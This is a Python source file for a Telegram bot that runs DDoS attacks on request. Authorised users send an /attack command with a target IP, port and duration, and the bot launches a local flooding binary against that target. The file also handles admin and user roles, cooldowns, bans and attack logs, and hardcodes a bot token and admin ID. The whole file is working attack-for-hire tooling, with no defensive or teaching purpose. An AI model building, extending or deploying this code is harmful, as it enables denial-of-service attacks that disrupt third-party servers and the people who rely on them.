import telebot
import subprocess
import json
import psutil
from datetime import datetime, timedelta

# Configuration and Constants
BOT_TOKEN = '7588841509:AAFY-qCrkKBcX5FFz_plh-0T6yw8NmOffJ8'  # Replace with your actual bot token
ADMIN_ID = 6965153309  # Replace with your main admin ID
MAX_ATTACK_TIME = 300  # Maximum allowed attack time in seconds for users
DEFAULT_THREAT_LEVEL = 50  # Default threat level for all users
ATTACK_LOG_FILE = "attack_log.json"
USER_DATA_FILE = "user_data.json"
WARNINGS_LIMIT = 3  # Number of warnings before a user is banned
BAN_DURATION = timedelta(days=1)  # Ban duration of 1 day for users
ATTACK_COOLDOWN = timedelta(minutes=2)  # Cooldown between attacks for users
BLACKLISTED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # List of blacklisted ports

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Load user data
try:
    with open(USER_DATA_FILE, "r") as f:
        user_data = json.load(f)
except FileNotFoundError:
    user_data = {"admins": [ADMIN_ID], "users": {}}  # If file doesn't exist, create a new one

# Function to save user data
def save_user_data():
    with open(USER_DATA_FILE, "w") as f:
        json.dump(user_data, f)

# Function to log attacks
def log_attack(user_id, target_ip, port, attack_time, threat_level):
    log_entry = {
        "user_id": user_id,
        "target_ip": target_ip,
        "port": port,
        "attack_time": attack_time,
        "threat_level": threat_level,
        "timestamp": str(datetime.now())
    }
    with open(ATTACK_LOG_FILE, "a") as log_file:
        json.dump(log_entry, log_file)
        log_file.write("\n")

# Check if the user is an admin or co-admin
def is_admin(user_id):
    return user_id == ADMIN_ID or user_id in user_data.get('admins', [])

# Check if the user is a normal user
def check_key(user_id):
    user = user_data.get(str(user_id), None)
    if user and user['key_valid']:
        # Check if user is banned
        if 'banned_until' in user:
            if datetime.now() < datetime.strptime(user['banned_until'], "%Y-%m-%d %H:%M:%S"):
                return False  # User is banned
            else:
                del user['banned_until']  # Remove the ban after expiration
                save_user_data()

        # Check cooldown between attacks for normal users only
        if user['last_attack_time']:
            time_since_last_attack = datetime.now() - datetime.strptime(user['last_attack_time'], "%Y-%m-%d %H:%M:%S")
            if time_since_last_attack < ATTACK_COOLDOWN:
                warn_user(user_id, "You must wait 2 minutes between attacks")
                return False
        return True
    return False

# Function to warn users and track warnings (for users only)
def warn_user(user_id, reason):
    if not is_admin(user_id):  # Only apply warnings to normal users
        user = user_data['users'].get(str(user_id), None)
        if user:
            user['warnings'] = user.get('warnings', 0) + 1
            save_user_data()
            bot.send_message(user_id, f"Warning: {reason}. You have {WARNINGS_LIMIT - user['warnings']} warnings left.")
            bot.send_message(ADMIN_ID, f"User {user_id} has been warned. Reason: {reason}. Total Warnings: {user['warnings']}")
            if user['warnings'] >= WARNINGS_LIMIT:
                ban_user(user_id)

# Function to ban users for 1 day (for users only)
def ban_user(user_id):
    if not is_admin(user_id):  # Only ban normal users
        user_data['users'][str(user_id)]['banned_until'] = (datetime.now() + BAN_DURATION).strftime("%Y-%m-%d %H:%M:%S")
        user_data['users'][str(user_id)]['warnings'] = 0  # Reset warnings after ban
        save_user_data()
        bot.send_message(user_id, "You have been banned for 24 hours due to breaking the rules.")
        bot.send_message(ADMIN_ID, f"User {user_id} has been banned for 24 hours.")

# Function to execute the DDoS attack using the binary file
def execute_attack(user_id, target_ip, port, duration, threat_level):
    try:
        print(f"Executing attack for user {user_id}: {target_ip}:{port}, Duration: {duration}, Threat Level: {threat_level}")
        
        # Check if the attack duration exceeds the allowed maximum (for users only)
        if not is_admin(user_id) and duration > MAX_ATTACK_TIME:
            warn_user(user_id, f"Attack duration {duration} exceeds the maximum allowed time {MAX_ATTACK_TIME}.")
            return

        # Log the attack
        log_attack(user_id, target_ip, port, duration, threat_level)

        # Construct the command to run the attack
        command = f'./vof {target_ip} {port} {duration} {threat_level} 50'
        subprocess.Popen(command.split())
        bot.send_message(user_id, f"Attack launched on {target_ip}:{port} for {duration}s with threat level {threat_level}.")
    except Exception as e:
        bot.send_message(user_id, f"Failed to launch attack: {e}")

# Command for admin to add a normal user
@bot.message_handler(commands=['add_user'])
def handle_add_user(message):
    if is_admin(message.from_user.id):
        try:
            user_id = int(message.text.split()[1])
            if str(user_id) not in user_data['users']:
                user_data['users'][str(user_id)] = {
                    "key_valid": True,
                    "warnings": 0,
                    "last_attack_time": None
                }
                save_user_data()
                bot.send_message(user_id, "You have been added as a user.")
                bot.send_message(ADMIN_ID, f"User {user_id} has been added.")
            else:
                bot.send_message(ADMIN_ID, "User already exists.")
        except (IndexError, ValueError):
            bot.send_message(ADMIN_ID, "Usage: /add_user <user_id>")
    else:
        bot.send_message(message.from_user.id, "You do not have permission to add users.")

# Command for the main admin to add another admin
@bot.message_handler(commands=['add_admin'])
def handle_add_admin(message):
    if message.from_user.id == ADMIN_ID:
        try:
            new_admin_id = int(message.text.split()[1])
            if new_admin_id not in user_data['admins']:
                user_data['admins'].append(new_admin_id)
                save_user_data()
                bot.send_message(new_admin_id, "You have been added as an admin.")
                bot.send_message(ADMIN_ID, f"User {new_admin_id} has been added as an admin.")
            else:
                bot.send_message(ADMIN_ID, "Admin already exists.")
        except (IndexError, ValueError):
            bot.send_message(ADMIN_ID, "Usage: /add_admin <user_id>")
    else:
        bot.send_message(message.from_user.id, "You do not have permission to add admins.")

# Command for admins to view the attack logs
@bot.message_handler(commands=['view_logs'])
def handle_view_logs(message):
    user_id = message.from_user.id
    if is_admin(user_id):
        try:
            with open(ATTACK_LOG_FILE, "r") as log_file:
                logs = log_file.readlines()
                bot.send_message(user_id, "Attack History:")
                for log_entry in logs:
                    bot.send_message(user_id, log_entry)
        except FileNotFoundError:
            bot.send_message(user_id, "No logs found.")
    else:
        bot.send_message(user_id, "You do not have permission to view logs.")

# Command to check VPS status (Admin and co-admins)
@bot.message_handler(commands=['vps_status'])
def handle_vps_status(message):
    user_id = message.from_user.id
    if is_admin(user_id):
        # Get CPU and memory usage
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        memory_usage = memory_info.percent
        
        status_message = (f"VPS Health:\n"
                          f"CPU Usage: {cpu_usage}%\n"
                          f"Memory Usage: {memory_usage}%")
        bot.send_message(user_id, status_message)
    else:
        bot.send_message(user_id, "You do not have permission to view VPS status.")

# Command to launch an attack (Only for approved users)
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    if not check_key(user_id):
        bot.send_message(user_id, "Invalid or expired key, or you are banned.")
        return

    try:
        args = message.text.split()
        if len(args) < 4:
            bot.send_message(user_id, "Usage: /attack <ip> <port> <time>")
            return

        target_ip = args[1]
        port = int(args[2])
        attack_time = int(args[3])
        threat_level = DEFAULT_THREAT_LEVEL

        if is_admin(user_id) and len(args) == 5:
            threat_level = int(args[4])

        execute_attack(user_id, target_ip, port, attack_time, threat_level)

    except (IndexError, ValueError) as e:
        bot.send_message(user_id, "Usage: /attack <ip> <port> <time>")

# Command to display help message with all commands
@bot.message_handler(commands=['help'])
def handle_help(message):
    help_message = """
    Here are the available commands:

    **Admin Commands:**
    - /add_user <user_id> - Add a new user
    - /add_admin <user_id> - Add a new admin
    - /view_logs - View all attack logs
    - /vps_status - View VPS health (CPU and memory usage)
    - /attack <ip> <port> <time> [threat_level] - Launch an attack (Admins can specify a custom threat level)

    **User Commands:**
    - /attack <ip> <port> <time> - Launch an attack (using default threat level)
    
    Warning system applies only to normal users. Admins are not subject to attack limits or warnings.
    """
    bot.send_message(message.chat.id, help_message)

# Polling to listen for messages
bot.polling(none_stop=True)
